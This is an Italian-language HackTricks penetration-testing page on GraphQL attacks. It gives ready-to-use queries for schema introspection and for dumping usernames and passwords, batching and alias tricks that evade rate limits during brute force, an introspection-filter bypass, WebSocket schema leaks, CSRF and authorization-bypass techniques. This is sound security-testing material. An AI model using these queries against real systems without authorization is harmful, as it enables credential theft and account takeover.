# GraphQL

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Introduzione

GraphQL √® **evidenziato** come un **alternativa efficiente** alle API REST, offrendo un approccio semplificato per interrogare i dati dal backend. A differenza di REST, che spesso richiede numerose richieste attraverso vari endpoint per raccogliere dati, GraphQL consente di recuperare tutte le informazioni necessarie tramite una **singola richiesta**. Questa semplificazione **beneficia notevolmente gli sviluppatori** riducendo la complessit√† dei loro processi di recupero dati.

## GraphQL e Sicurezza

Con l'avvento di nuove tecnologie, inclusa GraphQL, emergono anche nuove vulnerabilit√† di sicurezza. Un punto chiave da notare √® che **GraphQL non include meccanismi di autenticazione per impostazione predefinita**. √à responsabilit√† degli sviluppatori implementare tali misure di sicurezza. Senza una corretta autenticazione, gli endpoint GraphQL possono esporre informazioni sensibili a utenti non autenticati, ponendo un rischio significativo per la sicurezza.

### Attacchi di Brute Force alle Directory e GraphQL

Per identificare le istanze GraphQL esposte, si raccomanda di includere percorsi specifici negli attacchi di brute force alle directory. Questi percorsi sono:

* `/graphql`
* `/graphiql`
* `/graphql.php`
* `/graphql/console`
* `/api`
* `/api/graphql`
* `/graphql/api`
* `/graphql/graphql`

Identificare le istanze GraphQL aperte consente di esaminare le query supportate. Questo √® cruciale per comprendere i dati accessibili tramite l'endpoint. Il sistema di introspezione di GraphQL facilita questo fornendo dettagli sulle query supportate da uno schema. Per ulteriori informazioni su questo, fare riferimento alla documentazione di GraphQL sull'introspezione: [**GraphQL: A query language for APIs.**](https://graphql.org/learn/introspection/)

### Fingerprint

Lo strumento [**graphw00f**](https://github.com/dolevf/graphw00f) √® in grado di rilevare quale motore GraphQL viene utilizzato in un server e poi stampa alcune informazioni utili per l'auditor di sicurezza.

#### Query universali <a href="#universal-queries" id="universal-queries"></a>

Per controllare se un URL √® un servizio GraphQL, pu√≤ essere inviata una **query universale**, `query{__typename}`. Se la risposta include `{"data": {"__typename": "Query"}}`, conferma che l'URL ospita un endpoint GraphQL. Questo metodo si basa sul campo `__typename` di GraphQL, che rivela il tipo dell'oggetto interrogato.
```javascript
query{__typename}
```
### Enumerazione di Base

Graphql di solito supporta **GET**, **POST** (x-www-form-urlencoded) e **POST**(json). Anche se per motivi di sicurezza √® consigliato consentire solo json per prevenire attacchi CSRF.

#### Introspezione

Per utilizzare l'introspezione per scoprire informazioni sullo schema, interroga il campo `__schema`. Questo campo √® disponibile sul tipo radice di tutte le query.
```bash
query={__schema{types{name,fields{name}}}}
```
Con questa query troverai il nome di tutti i tipi utilizzati:

![](<../../.gitbook/assets/image (1036).png>)

{% code overflow="wrap" %}
```bash
query={__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}
```
{% endcode %}

Con questa query puoi estrarre tutti i tipi, i loro campi e i loro argomenti (e il tipo degli argomenti). Questo sar√† molto utile per sapere come interrogare il database.

![](<../../.gitbook/assets/image (950).png>)

**Errori**

√à interessante sapere se gli **errori** verranno **mostrati** poich√© contribuiranno con informazioni utili.
```
?query={__schema}
?query={}
?query={thisdefinitelydoesnotexist}
```
![](<../../.gitbook/assets/image (416).png>)

**Enumerare lo Schema del Database tramite Introspezione**

{% hint style="info" %}
Se l'introspezione √® abilitata ma la query sopra non viene eseguita, prova a rimuovere le direttive `onOperation`, `onFragment` e `onField` dalla struttura della query.
{% endhint %}
```bash
#Full introspection query

query IntrospectionQuery {
__schema {
queryType {
name
}
mutationType {
name
}
subscriptionType {
name
}
types {
...FullType
}
directives {
name
description
args {
...InputValue
}
onOperation  #Often needs to be deleted to run query
onFragment   #Often needs to be deleted to run query
onField      #Often needs to be deleted to run query
}
}
}

fragment FullType on __Type {
kind
name
description
fields(includeDeprecated: true) {
name
description
args {
...InputValue
}
type {
...TypeRef
}
isDeprecated
deprecationReason
}
inputFields {
...InputValue
}
interfaces {
...TypeRef
}
enumValues(includeDeprecated: true) {
name
description
isDeprecated
deprecationReason
}
possibleTypes {
...TypeRef
}
}

fragment InputValue on __InputValue {
name
description
type {
...TypeRef
}
defaultValue
}

fragment TypeRef on __Type {
kind
name
ofType {
kind
name
ofType {
kind
name
ofType {
kind
name
}
}
}
}
```
Query di introspezione inline:
```
/?query=fragment%20FullType%20on%20Type%20{+%20%20kind+%20%20name+%20%20description+%20%20fields%20{+%20%20%20%20name+%20%20%20%20description+%20%20%20%20args%20{+%20%20%20%20%20%20...InputValue+%20%20%20%20}+%20%20%20%20type%20{+%20%20%20%20%20%20...TypeRef+%20%20%20%20}+%20%20}+%20%20inputFields%20{+%20%20%20%20...InputValue+%20%20}+%20%20interfaces%20{+%20%20%20%20...TypeRef+%20%20}+%20%20enumValues%20{+%20%20%20%20name+%20%20%20%20description+%20%20}+%20%20possibleTypes%20{+%20%20%20%20...TypeRef+%20%20}+}++fragment%20InputValue%20on%20InputValue%20{+%20%20name+%20%20description+%20%20type%20{+%20%20%20%20...TypeRef+%20%20}+%20%20defaultValue+}++fragment%20TypeRef%20on%20Type%20{+%20%20kind+%20%20name+%20%20ofType%20{+%20%20%20%20kind+%20%20%20%20name+%20%20%20%20ofType%20{+%20%20%20%20%20%20kind+%20%20%20%20%20%20name+%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}++query%20IntrospectionQuery%20{+%20%20schema%20{+%20%20%20%20queryType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20mutationType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20types%20{+%20%20%20%20%20%20...FullType+%20%20%20%20}+%20%20%20%20directives%20{+%20%20%20%20%20%20name+%20%20%20%20%20%20description+%20%20%20%20%20%20locations+%20%20%20%20%20%20args%20{+%20%20%20%20%20%20%20%20...InputValue+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}
```
L'ultima riga di codice √® una query graphql che estrarr√† tutte le meta-informazioni dal graphql (nomi degli oggetti, parametri, tipi...)

![](<../../.gitbook/assets/image (363).png>)

Se l'introspezione √® abilitata, puoi utilizzare [**GraphQL Voyager**](https://github.com/APIs-guru/graphql-voyager) per visualizzare in un'interfaccia grafica tutte le opzioni.

### Querying

Ora che sappiamo che tipo di informazioni sono salvate nel database, proviamo a **estrarre alcuni valori**.

Nell'introspezione puoi trovare **quale oggetto puoi interrogare direttamente** (perch√© non puoi interrogare un oggetto solo perch√© esiste). Nell'immagine seguente puoi vedere che il "_queryType_" si chiama "_Query_" e che uno dei campi dell'oggetto "_Query_" √® "_flags_", che √® anche un tipo di oggetto. Pertanto, puoi interrogare l'oggetto flag.

![](<../../.gitbook/assets/Screenshot from 2021-03-13 18-17-48.png>)

Nota che il tipo della query "_flags_" √® "_Flags_", e questo oggetto √® definito come segue:

![](<../../.gitbook/assets/Screenshot from 2021-03-13 18-22-57 (1).png>)

Puoi vedere che gli oggetti "_Flags_" sono composti da **name** e **value**. Quindi puoi ottenere tutti i nomi e i valori dei flag con la query:
```javascript
query={flags{name, value}}
```
Nota che nel caso in cui l'**oggetto da interrogare** sia un **tipo** **primitivo** come **stringa** come nel seguente esempio

![](<../../.gitbook/assets/image (958).png>)

Puoi semplicemente interrogarlo con:
```javascript
query={hiddenFlags}
```
In un altro esempio in cui c'erano 2 oggetti all'interno dell'oggetto di tipo "_Query_": "_user_" e "_users_".\
Se questi oggetti non necessitano di alcun argomento per la ricerca, potresti **recuperare tutte le informazioni da essi** semplicemente **chiedendo** i dati che desideri. In questo esempio da Internet potresti estrarre i nomi utente e le password salvate:

![](<../../.gitbook/assets/image (880).png>)

Tuttavia, in questo esempio se provi a farlo ottieni questo **errore**:

![](<../../.gitbook/assets/image (1042).png>)

Sembra che in qualche modo cercher√† utilizzando l'argomento "_**uid**_" di tipo _**Int**_.\
Comunque, gi√† sapevamo che, nella sezione [Basic Enumeration](graphql.md#basic-enumeration) era stata proposta una query che ci mostrava tutte le informazioni necessarie: `query={__schema{types{name,fields{name, args{name,description,type{name, kind, ofType{name, kind}}}}}}}`

Se leggi l'immagine fornita quando eseguo quella query vedrai che "_**user**_" aveva l'**arg** "_**uid**_" di tipo _Int_.

Quindi, eseguendo un leggero _**uid**_ bruteforce ho scoperto che in _**uid**=**1**_ √® stato recuperato un nome utente e una password:\
`query={user(uid:1){user,password}}`

![](<../../.gitbook/assets/image (90).png>)

Nota che ho **scoperto** che potevo chiedere i **parametri** "_**user**_" e "_**password**_" perch√© se provo a cercare qualcosa che non esiste (`query={user(uid:1){noExists}}`) ottengo questo errore:

![](<../../.gitbook/assets/image (707).png>)

E durante la **fase di enumerazione** ho scoperto che l'oggetto "_**dbuser**_" aveva come campi "_**user**_" e "_**password**_.

**Trucco di dump della stringa di query (grazie a @BinaryShadow\_)**

Se puoi cercare per un tipo di stringa, come: `query={theusers(description: ""){username,password}}` e **cerchi una stringa vuota** esso **dump** tutte le informazioni. (_Nota che questo esempio non √® correlato all'esempio dei tutorial, per questo esempio supponi di poter cercare utilizzando "**theusers**" tramite un campo String chiamato "**description**"_).

### Ricerca

In questa configurazione, un **database** contiene **persone** e **film**. Le **persone** sono identificate dalla loro **email** e **nome**; i **film** dal loro **nome** e **valutazione**. Le **persone** possono essere amiche tra loro e avere anche film, indicando relazioni all'interno del database.

Puoi **cercare** persone **per** il **nome** e ottenere le loro email:
```javascript
{
searchPerson(name: "John Doe") {
email
}
}
```
Puoi **cercare** persone **per** il **nome** e ottenere i loro **film** **sottoscritti**:
```javascript
{
searchPerson(name: "John Doe") {
email
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
Nota come √® indicato per recuperare il `name` dei `subscribedMovies` della persona.

Puoi anche **cercare pi√π oggetti contemporaneamente**. In questo caso, viene effettuata una ricerca di 2 film:
```javascript
{
searchPerson(subscribedMovies: [{name: "Inception"}, {name: "Rocky"}]) {
name
}
}r
```
O anche **relazioni di diversi oggetti utilizzando alias**:
```javascript
{
johnsMovieList: searchPerson(name: "John Doe") {
subscribedMovies {
edges {
node {
name
}
}
}
}
davidsMovieList: searchPerson(name: "David Smith") {
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
### Mutazioni

**Le mutazioni sono utilizzate per apportare modifiche lato server.**

Nell'**introspezione** puoi trovare le **mutazioni** **dichiarate**. Nell'immagine seguente, il "_MutationType_" √® chiamato "_Mutation_" e l'oggetto "_Mutation_" contiene i nomi delle mutazioni (come "_addPerson_" in questo caso):

![](<../../.gitbook/assets/Screenshot from 2021-03-13 18-26-27 (1).png>)

In questa configurazione, un **database** contiene **persone** e **film**. Le **persone** sono identificate dalla loro **email** e **nome**; i **film** dal loro **nome** e **valutazione**. Le **persone** possono essere amiche tra loro e avere anche film, indicando relazioni all'interno del database.

Una mutazione per **creare nuovi** film all'interno del database pu√≤ essere simile alla seguente (in questo esempio la mutazione √® chiamata `addMovie`):
```javascript
mutation {
addMovie(name: "Jumanji: The Next Level", rating: "6.8/10", releaseYear: 2019) {
movies {
name
rating
}
}
}
```
**Nota come sia i valori che il tipo di dati sono indicati nella query.**

Inoltre, il database supporta un'operazione di **mutazione**, chiamata `addPerson`, che consente la creazione di **persone** insieme alle loro associazioni con **amici** e **film** esistenti. √à fondamentale notare che gli amici e i film devono esistere nel database prima di collegarli alla persona appena creata.
```javascript
mutation {
addPerson(name: "James Yoe", email: "jy@example.com", friends: [{name: "John Doe"}, {email: "jd@example.com"}], subscribedMovies: [{name: "Rocky"}, {name: "Interstellar"}, {name: "Harry Potter and the Sorcerer's Stone"}]) {
person {
name
email
friends {
edges {
node {
name
email
}
}
}
subscribedMovies {
edges {
node {
name
rating
releaseYear
}
}
}
}
}
}
```
### Direttiva Overloading

Come spiegato in [**una delle vulnerabilit√† descritte in questo rapporto**](https://www.landh.tech/blog/20240304-google-hack-50000/), un overload di direttiva implica la chiamata di una direttiva anche milioni di volte per far sprecare operazioni al server fino a quando non √® possibile effettuare un DoS.

### Batching brute-force in 1 richiesta API

Queste informazioni sono state tratte da [https://lab.wallarm.com/graphql-batching-attack/](https://lab.wallarm.com/graphql-batching-attack/).\
Autenticazione tramite API GraphQL con **invio simultaneo di molte query con credenziali diverse** per verificarlo. √à un attacco di brute force classico, ma ora √® possibile inviare pi√π di una coppia login/password per richiesta HTTP grazie alla funzionalit√† di batching di GraphQL. Questo approccio ingannerebbe le applicazioni esterne di monitoraggio del tasso, facendole pensare che tutto va bene e che non ci sia un bot di brute-forcing che cerca di indovinare le password.

Di seguito puoi trovare la dimostrazione pi√π semplice di una richiesta di autenticazione dell'applicazione, con **3 coppie di email/password diverse alla volta**. Ovviamente √® possibile inviare migliaia in una singola richiesta nello stesso modo:

![](<../../.gitbook/assets/image (1081).png>)

Come possiamo vedere dallo screenshot della risposta, la prima e la terza richiesta hanno restituito _null_ e riflettevano le informazioni corrispondenti nella sezione _error_. La **seconda mutazione aveva i dati di autenticazione corretti** e la risposta ha il token di sessione di autenticazione corretto.

![](<../../.gitbook/assets/image (119) (1).png>)

## GraphQL Senza Introspezione

Sempre pi√π **endpoint graphql stanno disabilitando l'introspezione**. Tuttavia, gli errori che graphql genera quando viene ricevuta una richiesta inaspettata sono sufficienti per strumenti come [**clairvoyance**](https://github.com/nikitastupin/clairvoyance) per ricreare la maggior parte dello schema.

Inoltre, l'estensione di Burp Suite [**GraphQuail**](https://github.com/forcesunseen/graphquail) **osserva le richieste API GraphQL che passano attraverso Burp** e **costruisce** uno **schema** GraphQL interno con ogni nuova query che vede. Pu√≤ anche esporre lo schema per GraphiQL e Voyager. L'estensione restituisce una risposta falsa quando riceve una query di introspezione. Di conseguenza, GraphQuail mostra tutte le query, gli argomenti e i campi disponibili per l'uso all'interno dell'API. Per ulteriori informazioni [**controlla questo**](https://blog.forcesunseen.com/graphql-security-testing-without-a-schema).

Una bella **wordlist** per scoprire [**entit√† GraphQL pu√≤ essere trovata qui**](https://github.com/Escape-Technologies/graphql-wordlist?).

### Bypassare le difese di introspezione GraphQL <a href="#bypassing-graphql-introspection-defences" id="bypassing-graphql-introspection-defences"></a>

Per bypassare le restrizioni sulle query di introspezione nelle API, inserire un **carattere speciale dopo la parola chiave `__schema`** si √® dimostrato efficace. Questo metodo sfrutta le comuni distrazioni degli sviluppatori nei modelli regex che mirano a bloccare l'introspezione concentrandosi sulla parola chiave `__schema`. Aggiungendo caratteri come **spazi, nuove righe e virgole**, che GraphQL ignora ma che potrebbero non essere considerati nel regex, le restrizioni possono essere eluse. Ad esempio, una query di introspezione con una nuova riga dopo `__schema` pu√≤ bypassare tali difese:
```bash
# Example with newline to bypass
{
"query": "query{__schema
{queryType{name}}}"
}
```
Se non hai successo, considera metodi di richiesta alternativi, come **GET requests** o **POST con `x-www-form-urlencoded`**, poich√© le restrizioni potrebbero applicarsi solo alle richieste POST.

### Prova WebSockets

Come menzionato in [**questo intervento**](https://www.youtube.com/watch?v=tIo\_t5uUK50), verifica se potrebbe essere possibile connettersi a graphQL tramite WebSockets, poich√© ci√≤ potrebbe consentirti di bypassare un potenziale WAF e far s√¨ che la comunicazione websocket riveli lo schema del graphQL:
```javascript
ws = new WebSocket('wss://target/graphql', 'graphql-ws');
ws.onopen = function start(event) {
var GQL_CALL = {
extensions: {},
query: `
{
__schema {
_types {
name
}
}
}`
}

var graphqlMsg = {
type: 'GQL.START',
id: '1',
payload: GQL_CALL,
};
ws.send(JSON.stringify(graphqlMsg));
}
```
### **Scoprire Strutture GraphQL Esposte**

Quando l'introspezione √® disabilitata, esaminare il codice sorgente del sito web per query precaricate nelle librerie JavaScript √® una strategia utile. Queste query possono essere trovate utilizzando la scheda `Sources` negli strumenti per sviluppatori, fornendo informazioni sullo schema dell'API e rivelando potenzialmente **query sensibili esposte**. I comandi per cercare all'interno degli strumenti per sviluppatori sono:
```javascript
Inspect/Sources/"Search all files"
file:* mutation
file:* query
```
## CSRF in GraphQL

Se non sai cos'√® il CSRF, leggi la pagina seguente:

{% content-ref url="../../pentesting-web/csrf-cross-site-request-forgery.md" %}
[csrf-cross-site-request-forgery.md](../../pentesting-web/csrf-cross-site-request-forgery.md)
{% endcontent-ref %}

L√† fuori puoi trovare diversi endpoint GraphQL **configurati senza token CSRF.**

Nota che le richieste GraphQL vengono solitamente inviate tramite richieste POST utilizzando il Content-Type **`application/json`**.
```javascript
{"operationName":null,"variables":{},"query":"{\n  user {\n    firstName\n    __typename\n  }\n}\n"}
```
Tuttavia, la maggior parte degli endpoint GraphQL supporta anche **`form-urlencoded` richieste POST:**
```javascript
query=%7B%0A++user+%7B%0A++++firstName%0A++++__typename%0A++%7D%0A%7D%0A
```
Pertanto, poich√© le richieste CSRF come quelle precedenti vengono inviate **senza richieste preflight**, √® possibile **eseguire** **modifiche** nel GraphQL abusando di un CSRF.

Tuttavia, nota che il nuovo valore predefinito del cookie per il flag `samesite` di Chrome √® `Lax`. Ci√≤ significa che il cookie verr√† inviato solo da un sito web di terze parti in richieste GET.

Nota che √® solitamente possibile inviare la **richiesta** **query** anche come **richiesta** **GET** e il token CSRF potrebbe non essere convalidato in una richiesta GET.

Inoltre, abusando di un [**XS-Search**](../../pentesting-web/xs-search/) **attacco** potrebbe essere possibile esfiltrare contenuti dall'endpoint GraphQL abusando delle credenziali dell'utente.

Per ulteriori informazioni **controlla il** [**post originale qui**](https://blog.doyensec.com/2021/05/20/graphql-csrf.html).

## Hijacking WebSocket cross-site in GraphQL

Simile alle vulnerabilit√† CRSF che abusano di GraphQL, √® anche possibile eseguire un **hijacking WebSocket cross-site per abusare di un'autenticazione con GraphQL con cookie non protetti** e far eseguire all'utente azioni inaspettate in GraphQL.

Per ulteriori informazioni controlla:

{% content-ref url="../../pentesting-web/websocket-attacks.md" %}
[websocket-attacks.md](../../pentesting-web/websocket-attacks.md)
{% endcontent-ref %}

## Autorizzazione in GraphQL

Molte funzioni GraphQL definite sull'endpoint potrebbero controllare solo l'autenticazione del richiedente ma non l'autorizzazione.

Modificare le variabili di input della query potrebbe portare a dettagli sensibili dell'account [leaked](https://hackerone.com/reports/792927).

Le mutazioni potrebbero persino portare a un takeover dell'account tentando di modificare i dati di un altro account.
```javascript
{
"operationName":"updateProfile",
"variables":{"username":INJECT,"data":INJECT},
"query":"mutation updateProfile($username: String!,...){updateProfile(username: $username,...){...}}"
}
```
### Bypass authorization in GraphQL

[Chaining queries](https://s1n1st3r.gitbook.io/theb10g/graphql-query-authentication-bypass-vuln) insieme pu√≤ bypassare un sistema di autenticazione debole.

Nell'esempio sottostante puoi vedere che l'operazione √® "forgotPassword" e che dovrebbe eseguire solo la query forgotPassword associata. Questo pu√≤ essere bypassato aggiungendo una query alla fine, in questo caso aggiungiamo "register" e una variabile utente affinch√© il sistema registri un nuovo utente.

<figure><img src="../../.gitbook/assets/GraphQLAuthBypassMethod.PNG" alt=""><figcaption></figcaption></figure>

## Bypassing Rate Limits Using Aliases in GraphQL

In GraphQL, gli alias sono una funzionalit√† potente che consente di **nominare esplicitamente le propriet√†** quando si effettua una richiesta API. Questa capacit√† √® particolarmente utile per recuperare **pi√π istanze dello stesso tipo** di oggetto all'interno di una singola richiesta. Gli alias possono essere utilizzati per superare la limitazione che impedisce agli oggetti GraphQL di avere pi√π propriet√† con lo stesso nome.

Per una comprensione dettagliata degli alias GraphQL, si consiglia la seguente risorsa: [Aliases](https://portswigger.net/web-security/graphql/what-is-graphql#aliases).

Sebbene lo scopo principale degli alias sia ridurre la necessit√† di numerose chiamate API, √® stato identificato un caso d'uso non intenzionale in cui gli alias possono essere sfruttati per eseguire attacchi di forza bruta su un endpoint GraphQL. Questo √® possibile perch√© alcuni endpoint sono protetti da limitatori di velocit√† progettati per ostacolare gli attacchi di forza bruta limitando il **numero di richieste HTTP**. Tuttavia, questi limitatori di velocit√† potrebbero non tenere conto del numero di operazioni all'interno di ciascuna richiesta. Dato che gli alias consentono l'inclusione di pi√π query in una singola richiesta HTTP, possono eludere tali misure di limitazione della velocit√†.

Considera l'esempio fornito di seguito, che illustra come le query con alias possono essere utilizzate per verificare la validit√† dei codici sconto del negozio. Questo metodo potrebbe eludere la limitazione della velocit√† poich√© compila diverse query in una sola richiesta HTTP, consentendo potenzialmente la verifica di numerosi codici sconto simultaneamente.
```bash
# Example of a request utilizing aliased queries to check for valid discount codes
query isValidDiscount($code: Int) {
isvalidDiscount(code:$code){
valid
}
isValidDiscount2:isValidDiscount(code:$code){
valid
}
isValidDiscount3:isValidDiscount(code:$code){
valid
}
}
```
## Tools

### Vulnerability scanners

* [https://github.com/dolevf/graphql-cop](https://github.com/dolevf/graphql-cop): Testa le configurazioni errate comuni degli endpoint graphql
* [https://github.com/assetnote/batchql](https://github.com/assetnote/batchql): Script di auditing della sicurezza GraphQL con un focus sull'esecuzione di query e mutazioni batch GraphQL.
* [https://github.com/dolevf/graphw00f](https://github.com/dolevf/graphw00f): Fingerprint del graphql in uso
* [https://github.com/gsmith257-cyber/GraphCrawler](https://github.com/gsmith257-cyber/GraphCrawler): Toolkit che pu√≤ essere utilizzato per acquisire schemi e cercare dati sensibili, testare l'autorizzazione, forzare schemi e trovare percorsi per un dato tipo.
* [https://blog.doyensec.com/2020/03/26/graphql-scanner.html](https://blog.doyensec.com/2020/03/26/graphql-scanner.html): Pu√≤ essere utilizzato come standalone o [estensione Burp](https://github.com/doyensec/inql).
* [https://github.com/swisskyrepo/GraphQLmap](https://github.com/swisskyrepo/GraphQLmap): Pu√≤ essere utilizzato anche come client CLI per automatizzare attacchi
* [https://gitlab.com/dee-see/graphql-path-enum](https://gitlab.com/dee-see/graphql-path-enum): Strumento che elenca i diversi modi per **raggiungere un dato tipo in uno schema GraphQL**.
* [https://github.com/doyensec/GQLSpection](https://github.com/doyensec/GQLSpection): Il successore delle modalit√† Standalone e CLI di InQL
* [https://github.com/doyensec/inql](https://github.com/doyensec/inql): Estensione Burp per test avanzati di GraphQL. Lo _**Scanner**_ √® il nucleo di InQL v5.0, dove puoi analizzare un endpoint GraphQL o un file di schema di introspezione locale. Genera automaticamente tutte le possibili query e mutazioni, organizzandole in una vista strutturata per la tua analisi. Il componente _**Attacker**_ ti consente di eseguire attacchi batch GraphQL, che possono essere utili per eludere limiti di velocit√† mal implementati.
* [https://github.com/nikitastupin/clairvoyance](https://github.com/nikitastupin/clairvoyance): Prova a ottenere lo schema anche con l'introspezione disabilitata utilizzando l'aiuto di alcuni database Graphql che suggeriranno i nomi delle mutazioni e dei parametri.

### Clients

* [https://github.com/graphql/graphiql](https://github.com/graphql/graphiql): Client GUI
* [https://altair.sirmuel.design/](https://altair.sirmuel.design/): Client GUI

### Automatic Tests

{% embed url="https://graphql-dashboard.herokuapp.com/" %}

* Video che spiega AutoGraphQL: [https://www.youtube.com/watch?v=JJmufWfVvyU](https://www.youtube.com/watch?v=JJmufWfVvyU)

## References

* [**https://jondow.eu/practical-graphql-attack-vectors/**](https://jondow.eu/practical-graphql-attack-vectors/)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4**](https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4)
* [**http://ghostlulz.com/api-hacking-graphql/**](http://ghostlulz.com/api-hacking-graphql/)
* [**https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://portswigger.net/web-security/graphql**](https://portswigger.net/web-security/graphql)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di github.

</details>
{% endhint %}
